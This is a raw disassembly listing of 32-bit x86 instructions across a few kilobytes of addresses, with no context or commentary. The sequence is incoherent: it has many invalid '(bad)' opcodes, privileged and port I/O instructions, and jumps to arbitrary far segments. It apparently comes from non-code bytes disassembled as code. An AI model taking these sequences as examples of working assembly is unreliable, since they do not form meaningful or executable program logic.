  426656:	addr16 jne 0x42662e
  426659:	fs push esp
  42665b:	(bad)  
  42665c:	mov    cr1,ebx
  42665f:	rol    BYTE PTR [ebp+0x7e],cl
  426662:	ds inc esi
  426664:	dec    DWORD PTR [ecx+0xd]
  426667:	jg     0x42664d
  426669:	jns    0x426637
  42666b:	xchg   edi,eax
  42666c:	push   ebp
  42666d:	pop    es
  42666e:	inc    eax
  42666f:	jne    0x4266d6
  426671:	outs   dx,DWORD PTR ds:[esi]
  426672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426673:	mov    ebp,0x477dd120
  426678:	xor    edx,DWORD PTR [ebp-0x15]
  42667b:	push   ebp
  42667c:	rcr    DWORD PTR [ecx+ebp*2+0x2a],1
  426680:	xor    DWORD PTR [edx+edx*1+0x35476dcc],esp
  426687:	ins    DWORD PTR es:[edi],dx
  426688:	fidivr WORD PTR [ebp-0x3f66df37]
  42668e:	push   esi
  42668f:	cld    
  426690:	in     eax,0x9a
  426692:	(bad)  
  426694:	pop    esi
  426695:	stc    
  426696:	scas   al,BYTE PTR es:[edi]
  426697:	hlt    
  426698:	sbb    al,0x5
  42669a:	sti    
  42669b:	ret    
  42669c:	sub    dl,BYTE PTR [edx+0x6c969fe7]
  4266a2:	into   
  4266a3:	or     esi,esi
  4266a5:	int3   
  4266a6:	sub    bh,0x65
  4266a9:	mov    ecx,0x8eb3b8f6
  4266ae:	add    al,0x1
  4266b0:	fiadd  DWORD PTR ds:[ebx-0x3e12c513]
  4266b7:	xchg   BYTE PTR [edi],ch
  4266b9:	mov    ah,0x9
  4266bb:	into   
  4266bc:	jmp    0x426726
  4266be:	dec    ecx
  4266bf:	sbb    esp,esi
  4266c1:	rcl    BYTE PTR [esi-0xcd32ce5],0x67
  4266c8:	mov    ds:0xf3ed5afe,al
  4266cd:	lahf   
  4266ce:	cs je  0x426662
  4266d1:	push   ebx
  4266d2:	add    dl,BYTE PTR [edi+eax*1+0x1f]
  4266d6:	inc    DWORD PTR fs:[eax+0x39b321c]
  4266dd:	xchg   ecx,esp
  4266df:	js     0x426718
  4266e1:	jnp    0x426745
  4266e3:	out    dx,eax
  4266e4:	mov    cl,0x1a
  4266e6:	mov    ds:0x968a678,al
  4266eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266ec:	push   ebp
  4266ed:	pushf  
  4266ee:	add    ch,BYTE PTR [esp+edi*2-0x4a]
  4266f2:	xchg   ecx,eax
  4266f3:	es adc al,0x7b
  4266f6:	jge    0x4266ec
  4266f8:	in     al,0x67
  4266fa:	xchg   BYTE PTR [ecx+0x6394b37c],dh
  426700:	xor    eax,0x1af1ef49
  426705:	add    dh,BYTE PTR [edi+0x5eb2e6ae]
  42670b:	mov    ebp,?
  42670d:	out    dx,al
  42670e:	jmp    0x426778
  426710:	mov    al,ds:0x7ba5023b
  426715:	fisubr WORD PTR [ecx-0x3d]
  426718:	jnp    0x4266ce
  42671a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42671b:	not    ah
  42671d:	sbb    eax,0x6d5053ab
  426722:	dec    ebp
  426723:	and    edi,edi
  426725:	jge    0x426732
  426727:	aad    0xed
  426729:	icebp  
  42672a:	jecxz  0x42670e
  42672c:	fs push ds
  42672e:	or     eax,DWORD PTR [ebx+eax*2]
  426731:	xchg   edx,eax
  426732:	or     al,dh
  426734:	and    ebx,edi
  426736:	push   0x13879d48
  42673b:	mov    ds:0x5dbf4884,eax
  426740:	in     eax,0xb2
  426742:	adc    BYTE PTR [eax-0x4f],al
  426745:	dec    edi
  426746:	mov    eax,ds:0x3c94b6f8
  42674b:	lods   al,BYTE PTR ds:[esi]
  42674c:	in     al,dx
  42674d:	mov    WORD PTR [ecx+ecx*4+0x8d42940],?
  426754:	add    al,0xd5
  426756:	into   
  426757:	js     0x42676e
  426759:	in     eax,dx
  42675a:	leave  
  42675b:	add    dh,ah
  42675d:	jge    0x426786
  42675f:	aad    0xb8
  426761:	stos   BYTE PTR es:[edi],al
  426762:	add    edx,DWORD PTR [edx+0x24]
  426765:	iret   
  426766:	mov    bl,0xf9
  426768:	sbb    BYTE PTR [edx-0x4b69819f],dh
  42676e:	enter  0x2c9e,0x8b
  426772:	mov    edi,0x2ba1ff47
  426777:	or     esp,eax
  426779:	jo     0x42674f
  42677b:	repnz mov al,0xc9
  42677e:	dec    esp
  42677f:	mov    esp,0xe02c362e
  426784:	daa    
  426785:	jmp    0xff86:0xdb289bea
  42678c:	test   al,0xcb
  42678e:	or     cl,BYTE PTR [ebx]
  426790:	test   ebx,ebp
  426792:	out    dx,eax
  426793:	loop   0x4267b9
  426795:	into   
  426796:	mov    fs,edx
  426798:	add    DWORD PTR [edx-0x35],eax
  42679b:	das    
  42679c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42679d:	lods   al,BYTE PTR ds:[esi]
  42679e:	out    0xa0,al
  4267a0:	mov    edx,DWORD PTR [ebx-0x4af0d313]
  4267a6:	leave  
  4267a7:	or     dl,bh
  4267a9:	jge    0x426757
  4267ab:	movsx  eax,si
  4267ae:	(bad)  
	...
  4267b7:	add    BYTE PTR [eax],al
  4267b9:	add    BYTE PTR [eax-0x57e1776],dh
  4267bf:	jecxz  0x4267ba
  4267c1:	mov    ebx,0xcae72888
  4267c6:	rol    dh,1
  4267c8:	push   edi
  4267c9:	fistp  QWORD PTR [esi-0x22]
  4267cc:	add    DWORD PTR [eax],eax
  4267ce:	std    
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [esi+eax*8+0x123e7035],ch
  4267d8:	ds pop eax
  4267da:	fwait
  4267db:	aam    0x73
  4267dd:	(bad)
  4267e0:	ins    DWORD PTR es:[edi],dx
  4267e1:	add    DWORD PTR ss:[edx],edx
  4267e4:	cdq    
  4267e5:	jnp    0x42678d
  4267e7:	inc    edi
  4267e8:	rcl    DWORD PTR [ebx+0x31],0xe1
  4267ec:	adc    BYTE PTR [ebx],dh
  4267ee:	call   0x1457:0x567a920e
  4267f5:	data16 add al,BYTE PTR [ebx-0x1ea2af6c]
  4267fc:	jg     0x42679e
  4267fe:	rcr    ebx,0x68
  426801:	lods   eax,DWORD PTR ds:[esi]
  426802:	mov    eax,DWORD PTR [eax]
  426804:	pop    edx
  426805:	add    edi,DWORD PTR [ecx]
  426807:	lods   eax,DWORD PTR ds:[esi]
  426808:	test   al,0x32
  42680a:	fs push esp
  42680c:	inc    edi
  42680d:	pop    es
  42680e:	cli    
  42680f:	fiadd  DWORD PTR [ecx]
  426811:	and    DWORD PTR [ecx],ebp
  426813:	gs out dx,eax
  426815:	xor    al,0xa2
  426817:	jo     0x42684d
  426819:	inc    ecx
  42681a:	dec    edi
  42681b:	adc    ch,bl
  42681d:	mov    edx,0xff867c35
  426822:	ror    BYTE PTR [esi-0x4d],1
  426825:	cmp    eax,0xb85c0da7
  42682a:	or     al,0xd5
  42682c:	pusha  
  42682d:	push   0x24c511c
  426832:	lds    esp,FWORD PTR [eax]
  426834:	retf   
  426835:	xor    eax,0x24146c4b
  42683a:	sub    dh,cl
  42683c:	push   es
  42683d:	in     al,dx
  42683e:	dec    esi
  42683f:	cmp    al,0xaf
  426841:	icebp  
  426842:	jge    0x426877
  426844:	popa   
  426845:	mov    al,0x42
  426847:	out    0x34,al
  426849:	mov    ?,edi
  42684b:	cmp    DWORD PTR [edx],edx
  42684d:	inc    ebp
  42684e:	push   esp
  42684f:	test   al,0x21
  426851:	popf   
  426852:	shl    DWORD PTR [edx],1
  426854:	shl    BYTE PTR [ebx-0x4c],cl
  426857:	jmp    0xbf52:0x8cbbd1d6
  42685e:	and    BYTE PTR [esi],al
  426860:	jb     0x426867
  426862:	cli    
  426863:	pusha  
  426864:	in     al,0x73
  426866:	in     eax,dx
  426867:	xchg   cl,cl
  426869:	and    ecx,edi
  42686b:	push   ebp
  42686c:	int    0xcd
  42686e:	(bad)  
  426870:	enter  0x818d,0x51
  426874:	int    0xec
  426876:	mov    ebx,DWORD PTR [ecx+0x35]
  426879:	jmp    0xe7586e78
  42687e:	aam    0x24
  426880:	loopne 0x426872
  426882:	mov    edx,0xe9b4c361
  426887:	add    ebx,edi
  426889:	cmp    al,BYTE PTR [edx]
  42688b:	sub    edi,DWORD PTR [eax+0x7e23287]
  426891:	int    0xe
  426893:	or     al,0x5
  426895:	lock cs push ds
  426898:	enter  0x7cfc,0xc7
  42689c:	in     eax,0xb3
  42689e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42689f:	push   esp
  4268a0:	fisub  WORD PTR [eax+eiz*8-0x12c842f4]
  4268a7:	jmp    0x6f9f717a
  4268ac:	loope  0x4268b2
  4268ae:	data16 xor al,0x7b
  4268b1:	dec    ebp
  4268b2:	fisttp WORD PTR [ebx-0x24e09df4]
  4268b8:	cmp    eax,eax
  4268ba:	sub    ebp,ecx
  4268bc:	mov    ebp,0x3c536d32
  4268c1:	rol    BYTE PTR [eax+0x4e],1
  4268c4:	or     DWORD PTR [ecx],edi
  4268c6:	push   cs
  4268c7:	cli    
  4268c8:	inc    esi
  4268c9:	(bad)  
  4268ca:	cli    
  4268cb:	les    ebp,FWORD PTR [edx-0xc778b3a]
  4268d1:	loope  0x42690b
  4268d3:	cmc    
  4268d4:	jl     0x426891
  4268d6:	adc    bl,BYTE PTR [esi]
  4268d8:	mov    dl,0xde
  4268da:	in     eax,dx
  4268db:	push   es
  4268dc:	sub    BYTE PTR [ebx-0x1d],dl
  4268df:	dec    ebp
  4268e0:	jp     0x4268f5
  4268e2:	sbb    ebx,DWORD PTR [edx]
  4268e4:	ret    
  4268e5:	fisttp QWORD PTR [esi]
  4268e7:	mov    eax,0x1d67f998
  4268ec:	nop
  4268ed:	xor    al,0xea
  4268ef:	movsx  esp,bx
  4268f2:	mov    ebx,0x6fda8523
  4268f7:	pop    esp
  4268f8:	stc    
  4268f9:	fdiv   DWORD PTR [eax+edi*8-0x40af7f51]
  426900:	push   cs
  426901:	push   esp
  426902:	inc    edi
  426903:	gs xor al,0xd1
  426906:	xor    bh,BYTE PTR [esi-0x7f059de5]
  42690c:	push   0xffffffdc
  42690e:	pop    eax
  42690f:	int    0x6f
  426911:	js     0x4268fd
  426913:	jb     0x4268f5
  426915:	pop    ss
  426916:	jns    0x42689b
  426918:	mov    bh,al
  42691a:	imul   DWORD PTR [ecx+0x5e019dc3]
  426920:	and    eax,0x10dc5f91
  426925:	mov    ds:0x671af057,eax
  42692a:	sbb    al,0xba
  42692c:	test   BYTE PTR [ebp+esi*2+0x787aef85],dl
  426933:	xchg   edx,eax
  426934:	retf   
  426935:	sbb    BYTE PTR [edi-0x2df2e43],ah
  42693b:	clc    
  42693c:	mov    dh,0xdf
  42693e:	repnz and BYTE PTR [edi+0x2dfca2d1],cl
  426945:	outs   dx,BYTE PTR ds:[esi]
  426946:	out    dx,eax
  426947:	pusha  
  426948:	xor    ecx,DWORD PTR [edx]
  42694a:	out    dx,eax
  42694b:	push   esi
  42694c:	pop    ebx
  42694d:	sbb    BYTE PTR [ebp-0x4e5c5601],ah
  426953:	in     al,0x66
  426955:	out    dx,eax
  426956:	mov    esi,0xda95d3f6
  42695b:	arpl   si,ax
  42695d:	mov    tr0,ecx
  426960:	cmp    BYTE PTR [ebp-0x2c],dl
  426963:	xor    BYTE PTR [esi+0x7b],dh
  426966:	mov    cl,0xf7
  426968:	stc    
  426969:	mov    WORD PTR [ebx+0x6870d1d6],?
  42696f:	mov    ds:0x6d95fdb8,eax
  426974:	push   eax
  426975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426976:	pop    esp
  426977:	dec    ebx
  426978:	or     esi,eax
  42697a:	repnz scas al,BYTE PTR es:[edi]
  42697c:	repz dec ebx
  42697e:	mov    esp,0x2e7cd5b1
  426983:	mov    esp,0x48bce742
  426988:	xor    BYTE PTR [eax-0x4],bh
  42698b:	addr16 in al,dx
  42698d:	push   ss
  42698e:	mov    ecx,0x89500ffc
  426993:	mov    cl,0x7e
  426995:	and    DWORD PTR [ecx+0x5a],esp
  426998:	jp     0x426939
  42699a:	(bad)  
  42699b:	cmp    eax,0x71ecb16b
  4269a0:	enter  0xe017,0x55
  4269a4:	push   esi
  4269a5:	bound  edi,QWORD PTR [edx]
  4269a7:	jno    0x426a03
  4269a9:	mov    DWORD PTR [ebx],ecx
  4269ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269ac:	xchg   esi,eax
  4269ad:	xor    DWORD PTR [edx+0x0],edx
  4269b0:	hlt    
  4269b1:	scas   eax,DWORD PTR es:[edi]
  4269b2:	sub    BYTE PTR [esi+ecx*8+0x4058a656],cl
  4269b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269ba:	je     0x426a0d
  4269bc:	jl     0x426998
  4269be:	pop    ebp
  4269bf:	adc    dl,BYTE PTR [ecx+0x6284dd9]
  4269c5:	jg     0x42695e
  4269c7:	aam    0xf4
  4269c9:	pop    ds
  4269ca:	jno    0x426a03
  4269cc:	fsubr  QWORD PTR [esi+0x45]
	...
  4269da:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  4269e1:	fcomp  QWORD PTR [edi+0x23]
  4269e4:	or     al,0x8a
  4269e6:	adc    dh,dh
  4269e8:	jmp    0xfd00:0x1e07b29
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [edx+0x34160aa9],ah
  4269f7:	jg     0x426a26
  4269f9:	or     BYTE PTR [esi],dl
  4269fb:	pop    edi
  4269fc:	inc    edx
  4269fd:	sub    dl,al
  4269ff:	or     eax,0xf3affb0d
  426a04:	dec    edi
  426a05:	xrelease mov BYTE PTR [edi-0x10],dl
  426a09:	bound  eax,QWORD PTR [eax+0x78]
  426a0c:	repz scas eax,DWORD PTR es:[edi]
  426a0e:	push   es
  426a0f:	mov    dh,0x5
  426a11:	leave  
  426a12:	outs   dx,BYTE PTR ds:[esi]
  426a13:	add    dl,0x7f
  426a16:	repnz mov eax,0x5037116d
  426a1c:	ja     0x426a9c
  426a1e:	xchg   ebx,eax
  426a1f:	jmp    0xbb5ab22a
  426a24:	mov    esp,0x287b8c26
  426a29:	test   eax,0x3cd43f97
  426a2e:	popf   
  426a2f:	jecxz  0x426a0f
  426a31:	add    al,0x8f
  426a33:	cld    
  426a34:	push   0xffffffb5
  426a36:	xlat   BYTE PTR ds:[ebx]
  426a37:	ja     0x426a41
  426a39:	das    
  426a3a:	fiadd  DWORD PTR [ecx+eiz*1]
  426a3d:	or     DWORD PTR [edi-0x495c11d2],edx
  426a43:	adc    al,0xe3
  426a46:	dec    ebp
  426a47:	aam    0x7b
  426a49:	mov    edi,0x2fc661ff
  426a4e:	mov    WORD PTR es:[ebp-0x52ee4c58],?
  426a55:	leave  
  426a56:	jl     0x426a0a
  426a58:	pushf  
  426a59:	lahf   
  426a5a:	push   eax
  426a5b:	(bad)  
  426a5c:	adc    ebp,ebx
  426a5e:	xchg   ebp,eax
  426a5f:	(bad)  
  426a60:	aam    0xfb
  426a62:	inc    esp
  426a63:	(bad)
  426a67:	imul   esp,esi,0xf732ea18
  426a6d:	cmp    eax,0x604a12dd
  426a72:	mov    DWORD PTR [edx+0x44],edx
  426a75:	push   ebx
  426a76:	and    BYTE PTR [ebx],al
  426a78:	jne    0x426a1f
  426a7a:	pop    ecx
  426a7b:	cmp    al,0xc
  426a7d:	fnstsw WORD PTR [edx+edx*8-0x1007cb2b]
  426a84:	enter  0x2aa9,0x19
  426a88:	pop    ebp
  426a89:	jnp    0x426ad8
  426a8b:	(bad)  
  426a8d:	dec    edx
  426a8e:	and    eax,0x969c1658
  426a93:	addr16 loopne 0x426acd
  426a96:	(bad)  
  426a97:	sar    cl,1
  426a99:	or     DWORD PTR [esi],eax
  426a9b:	jb     0x426aab
  426a9d:	push   ecx
  426a9e:	je     0x426aee
  426aa0:	ss and eax,0xb37b3aa1
  426aa6:	dec    BYTE PTR [ebp+0x46]
  426aa9:	shl    ah,cl
  426aab:	out    0xb6,eax
  426aad:	jns    0x426aea
  426aaf:	test   BYTE PTR [edx+0xe603c18],al
  426ab5:	clc    
  426ab6:	mov    ecx,0x7dbc0e46
  426abb:	into   
  426abc:	mov    WORD PTR [edx],gs
  426abe:	int3   
  426abf:	iret   
  426ac0:	mov    al,ds:0xdb4adfbf
  426ac5:	jnp    0x426a6d
  426ac7:	xlat   BYTE PTR ds:[ebx]
  426ac8:	enter  0x1c6,0xe
  426acc:	bound  edx,QWORD PTR [edx-0x61a7bf82]
  426ad2:	mov    ah,0x87
  426ad4:	push   0x2157b9c6
  426ad9:	mov    ch,0xf2
  426adb:	lea    esi,[eax+edx*8]
  426ade:	jo     0x426ab2
  426ae0:	sbb    ch,0x55
  426ae3:	sbb    eax,0x2c5b71b9
  426ae8:	jbe    0x426a7c
  426aea:	out    0x6e,al
  426aec:	cmp    BYTE PTR [eax],al
  426aee:	test   BYTE PTR [edi+0x69d571e5],ch
  426af4:	xchg   ecx,eax
  426af5:	test   esp,edi
  426af7:	sbb    edi,DWORD PTR [edi-0x42b2799]
  426afd:	inc    ebx
  426afe:	sub    DWORD PTR [ecx-0x2735825c],0xffffffa2
  426b05:	mov    ebp,0xb9ad1a88
  426b0a:	retf   
  426b0b:	add    ecx,eax
  426b0d:	cmp    eax,0x2ba9452f
  426b12:	xor    eax,0x2e59633d
  426b17:	mov    cl,0x50
  426b19:	out    dx,al
  426b1a:	not    DWORD PTR [edi+0x3b]
  426b1d:	cmp    DWORD PTR [edx-0x57],esp
  426b20:	add    bh,BYTE PTR [ebp+0x79a75819]
  426b26:	jg     0x426b69
  426b28:	sub    esp,DWORD PTR [edx-0x4c]
  426b2b:	scas   al,BYTE PTR es:[edi]
  426b2c:	push   ebp
  426b2d:	test   eax,0xf475a859
  426b32:	xchg   edx,eax
  426b33:	add    DWORD PTR [ebx],ecx
  426b35:	sub    dh,BYTE PTR [eax]
  426b37:	jg     0x426add
  426b39:	add    BYTE PTR [esi+0x6977eb2b],dl
  426b3f:	ss pop ss
  426b41:	es mov dh,0x1c
  426b44:	lods   al,BYTE PTR ds:[esi]
  426b45:	leave  
  426b46:	sub    al,0xdb
  426b48:	sub    BYTE PTR cs:[esi+0x3b],bh
  426b4c:	push   cs
  426b4d:	aas    
  426b4e:	mov    ch,0x26
  426b50:	cmp    dh,BYTE PTR [ebx-0x30]
  426b53:	or     cl,dl
  426b55:	xor    BYTE PTR [ecx+0x25],cl
  426b58:	addr16 xor eax,0x42ec3e80
  426b5e:	js     0x426b0a
  426b60:	mov    al,ds:0x1bf74b3b
  426b65:	int    0x49
  426b67:	mov    eax,0x10f287ae
  426b6c:	inc    ebp
  426b6d:	push   ss
  426b6e:	shr    DWORD PTR [edi],cl
  426b70:	mov    eax,0xb8cafdcc
  426b75:	out    dx,al
  426b76:	jnp    0x426bc0
  426b78:	fbstp  TBYTE PTR [ecx+0x3b]
  426b7b:	in     eax,0x28
  426b7d:	aas    
  426b7e:	pop    esi
  426b7f:	jle    0x426b0f
  426b81:	les    esp,FWORD PTR [eax]
  426b83:	pop    edi
  426b84:	out    dx,al
  426b85:	popa   
  426b86:	sub    ebx,DWORD PTR [edx]
  426b88:	enter  0xfef3,0xbf
  426b8c:	mov    edi,0x523aeb39
  426b91:	jl     0x426b34
  426b93:	fisub  WORD PTR [ebp+0x37]
  426b96:	xchg   DWORD PTR [edi],esi
  426b98:	sub    al,0x40
  426b9a:	ret    0x9fa5
  426b9d:	push   ss
  426b9e:	mov    dl,BYTE PTR [esi+0xd]
  426ba1:	cdq    
  426ba2:	lods   al,BYTE PTR gs:[esi]
  426ba4:	xchg   edi,eax
  426ba5:	call   0x8c68:0x3aa0fc8
  426bac:	fdiv   DWORD PTR [esi-0x34a76546]
  426bb2:	adc    eax,0x406c2d90
  426bb7:	pusha  
  426bb8:	cmp    edx,ebx
  426bba:	jnp    0x426bf6
  426bbc:	sub    dl,dh
  426bbe:	daa    
  426bbf:	rcr    BYTE PTR [ebx+ebx*4+0x6ba005d4],1
  426bc6:	(bad)  
  426bc7:	sbb    edi,DWORD PTR [ebp+0x24]
  426bca:	xchg   DWORD PTR [eax-0x7716d78c],ebx
  426bd0:	cdq    
  426bd1:	test   al,0xf6
  426bd3:	in     al,0x8e
  426bd5:	xchg   BYTE PTR [edi+eax*2],ch
  426bd8:	mov    ch,0xd
  426bda:	pushf  
  426bdb:	fbstp  TBYTE PTR [edi+0x68240d49]
  426be1:	or     esi,esp
  426be3:	mov    esp,0x3d896eff
  426be8:	fwait
  426be9:	jae    0x426c55
  426beb:	sub    BYTE PTR [edx],ah
  426bed:	dec    eax
  426bee:	lahf   
	...
  426bf7:	add    BYTE PTR [eax],al
  426bf9:	add    BYTE PTR [eax-0x56],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xcafe433f,al
  426c07:	aaa    
  426c08:	(bad)  
  426c09:	idiv   BYTE PTR [eax-0x1e]
  426c0c:	add    DWORD PTR [eax],eax
  426c0e:	std    
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [ecx+0x3],ah
  426c14:	cmp    BYTE PTR [ecx],bl
  426c16:	add    ebx,edx
  426c18:	cs xchg ecx,eax
  426c1a:	or     ch,ch
  426c1c:	sbb    dl,BYTE PTR [ebx*2+0x45e95fa6]
  426c23:	mov    ch,0x55
  426c25:	dec    esp
  426c26:	cld    
  426c27:	and    ch,BYTE PTR [edx]
  426c29:	add    al,0x6
  426c2b:	retf   0x297c
  426c2e:	sub    eax,0x59bd6f17
  426c33:	sub    ah,BYTE PTR [eax-0x778a0beb]
  426c39:	sti    
  426c3a:	mov    al,0xad
  426c3c:	lds    ebp,FWORD PTR [esi+0x53]
  426c3f:	jno    0x426bd2
  426c41:	test   esi,esp
  426c43:	xor    BYTE PTR [esi],bh
  426c45:	sub    DWORD PTR [eax],ebp
  426c47:	sar    DWORD PTR [ebx+0x43],cl
  426c4a:	jmp    0x426be7
  426c4c:	pusha  
  426c4d:	jecxz  0x426ca3
  426c4f:	mov    ecx,0xf73e2ec6
  426c54:	aas    
  426c55:	dec    ebx
  426c56:	or     ebx,esi
  426c58:	je     0x426c7b
  426c5a:	cmc    
  426c5b:	mov    ecx,0x4c5ae152
  426c60:	sub    al,0xc1
  426c62:	xchg   esp,eax
  426c63:	mov    dh,0xa8
  426c65:	xor    BYTE PTR [edx-0x777f8324],cl
  426c6b:	shr    DWORD PTR es:[edi+0x4cfdb8b2],cl
  426c72:	xor    ecx,DWORD PTR [ebp-0x6416a06f]
  426c78:	ja     0x426c10
  426c7a:	ins    DWORD PTR es:[edi],dx
  426c7b:	mov    cl,0x8e
  426c7d:	xchg   edx,eax
  426c7e:	push   ebx
  426c7f:	mov    bl,0x40
  426c81:	lahf   
  426c82:	jl     0x426cd0
  426c84:	out    dx,al
  426c85:	bound  ebp,QWORD PTR [ecx-0x6c]
  426c88:	out    dx,eax
  426c89:	cld    
  426c8a:	adc    eax,0x2405f6f
  426c8f:	fcomp  QWORD PTR [ebx-0x17]
  426c93:	jg     0x426c7e
  426c95:	jg     0x426cc0
  426c97:	nop
  426c98:	aam    0xc5
  426c9a:	or     edi,DWORD PTR ds:[ecx-0x65]
  426c9e:	out    0x6a,al
  426ca0:	jge    0x426c57
  426ca2:	cmp    dh,BYTE PTR [esi-0x41]
  426ca5:	leave  
  426ca6:	popa   
  426ca7:	sub    eax,0xa4e4d779
  426cac:	jmp    0xf7008516
  426cb1:	mov    al,0x48
  426cb3:	lds    ebp,FWORD PTR [esi+0x26]
  426cb6:	mov    ebx,cs
  426cb8:	test   BYTE PTR [edx-0x54],al
  426cbb:	pop    ebx
  426cbc:	popf   
  426cbd:	outs   dx,BYTE PTR ds:[esi]
  426cbe:	fild   DWORD PTR [edx+0x610ce7ee]
  426cc4:	cmp    ebp,DWORD PTR [edi+0x19f022cb]
  426cca:	sti    
  426ccb:	aad    0xe0
  426ccd:	cmp    BYTE PTR [edx+ebx*4],ah
  426cd0:	icebp  
  426cd1:	adc    BYTE PTR [eax-0x48272cda],cl
  426cd7:	inc    edx
  426cd8:	adc    DWORD PTR [eax+0x6],0x8dfb184a
  426cdf:	retfw  
  426ce1:	pop    esp
  426ce2:	xlat   BYTE PTR ds:[ebx]
  426ce3:	imul   edi,DWORD PTR [eax-0x76],0xfffffff9
  426ce7:	xchg   edi,esp
  426ce9:	push   es
  426cea:	jge    0x426c6f
  426cec:	xchg   esp,eax
  426ced:	shl    BYTE PTR [esi+0x4a],1
  426cf0:	pushf  
  426cf1:	and    DWORD PTR [edi-0x578857ae],ecx
  426cf7:	sbb    BYTE PTR [ebx+0x3d],bl
  426cfa:	loop   0x426d05
  426cfc:	fs push esi
  426cfe:	jne    0x426ca0
  426d00:	push   ebp
  426d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d02:	mul    BYTE PTR [ecx+ecx*2]
  426d05:	ins    DWORD PTR es:[edi],dx
  426d06:	retf   0x275b
  426d09:	mov    ecx,0x601cb6f9
  426d0e:	mov    eax,ds:0x85c147b9
  426d13:	and    al,0xba
  426d15:	push   es
  426d16:	scas   eax,DWORD PTR es:[edi]
  426d17:	xor    esp,edx
  426d19:	mov    esi,0x8f9bd04b
  426d1e:	mov    DWORD PTR [esi-0x7fb3ae0e],0x65eec5b3
  426d28:	xchg   ecx,eax
  426d29:	xchg   ebp,eax
  426d2a:	and    BYTE PTR [ecx-0x59],bh
  426d2d:	fs xor al,0x51
  426d30:	sub    al,0xd8
  426d32:	icebp  
  426d33:	pop    es
  426d34:	test   BYTE PTR [edi+0x22033bb0],ch
  426d3a:	add    al,0x61
  426d3c:	xlat   BYTE PTR ds:[ebx]
  426d3d:	adc    eax,0x9695226b
  426d42:	pop    edi
  426d43:	out    dx,eax
  426d44:	xchg   BYTE PTR [edi+0x262434c8],bh
  426d4a:	les    ebx,FWORD PTR [ebp+edi*8-0x5d]
  426d4e:	lea    esp,[esi+ebx*2-0x44]
  426d52:	inc    ebx
  426d53:	dec    ebx
  426d54:	xchg   ecx,eax
  426d55:	xor    ebx,ecx
  426d57:	xchg   ebx,eax
  426d58:	sbb    al,0xb0
  426d5a:	push   eax
  426d5b:	dec    esp
  426d5c:	fcomp  DWORD PTR [ecx+0x6b]
  426d5f:	cmp    eax,0x4ef98bb7
  426d64:	(bad)  [esi+0x6eff1ceb]
  426d6b:	les    ebp,FWORD PTR [edi-0x25]
  426d6e:	pop    ss
  426d6f:	jle    0x426d84
  426d71:	mov    ebx,DWORD PTR [ecx-0x1d]
  426d74:	push   ecx
  426d75:	cmp    eax,0xabcb41ac
  426d7a:	mov    cl,0xe4
  426d7c:	loope  0x426d39
  426d7e:	pop    es
  426d7f:	out    0xe4,al
  426d81:	ss ret 
  426d83:	mov    edx,ss
  426d85:	rcl    DWORD PTR [ecx+ebx*4+0x30c68041],1
  426d8c:	loope  0x426d3e
  426d8e:	mov    esp,0x3a3de90f
  426d93:	stc    
  426d94:	dec    edi
  426d95:	lock add BYTE PTR [esi-0x50],ch
  426d99:	push   esp
  426d9a:	fs pop esi
  426d9c:	jno    0x426d6e
  426d9e:	fisubr DWORD PTR ds:0x69272e7
  426da4:	jl     0x426e10
  426da6:	inc    ecx
  426da7:	jns    0x426de4
  426da9:	push   edx
  426daa:	mov    ds:0xdf1f653b,eax
  426daf:	mov    WORD PTR [ebx+0x44],es
  426db2:	jbe    0x426deb
  426db4:	cmp    ecx,edi
  426db6:	loop   0x426da2
  426db8:	cmc    
  426db9:	jecxz  0x426d74
  426dbb:	jge    0x426dc9
  426dbd:	pop    esp
  426dbe:	jl     0x426e13
  426dc0:	push   ebp
  426dc1:	out    0x4,eax
  426dc3:	lock jle 0x426d5b
  426dc6:	(bad)  
  426dc7:	hlt    
  426dc8:	cld    
  426dc9:	jl     0x426e46
  426dcb:	jmp    0x3573423f
  426dd0:	or     al,0xd
  426dd2:	daa    
  426dd3:	cmp    edx,ebp
  426dd5:	inc    ecx
  426dd6:	sub    eax,0xcbed8c4d
  426ddb:	jmp    0x42cc:0xf1bdf5bd
  426de2:	les    eax,FWORD PTR [ebp+0x492062ad]
  426de8:	mov    al,0xdb
  426dea:	jl     0x426da0
  426dec:	push   ds
  426ded:	scas   eax,DWORD PTR es:[edi]
  426dee:	stos   DWORD PTR es:[edi],eax
  426def:	xchg   DWORD PTR [edx],edx
  426df1:	cmp    dl,BYTE PTR [ebx+0x51]
  426df4:	mov    cs,WORD PTR [edx-0xc]
  426df7:	bound  ebx,QWORD PTR [esi-0x12]
  426dfa:	mov    ebp,0x5d555b51
  426dff:	adc    dh,BYTE PTR [eax]
  426e01:	(bad)  
  426e02:	add    edx,0xffffffb2
  426e05:	test   eax,0x6ed55199
  426e0a:	mov    dh,BYTE PTR es:[ecx+ebp*1+0x73]
	...
  426e1a:	mov    dh,0xe4
  426e1c:	xlat   BYTE PTR ds:[ebx]
  426e1d:	push   esp
  426e1e:	xlat   BYTE PTR ds:[ebx]
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	fcom   QWORD PTR [edi-0x1b8a200f]
  426e2c:	add    DWORD PTR [eax],eax
  426e2e:	std    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [ebx-0x312e58d1],dh
  426e37:	or     al,0x37
  426e39:	inc    eax
  426e3a:	adc    esi,DWORD PTR [eax]
  426e3c:	and    edi,DWORD PTR [edx+0x7]
  426e3f:	mov    bh,0xc7
  426e41:	or     DWORD PTR ss:[ebp+edi*2-0x646a6cae],edx
  426e49:	popf   
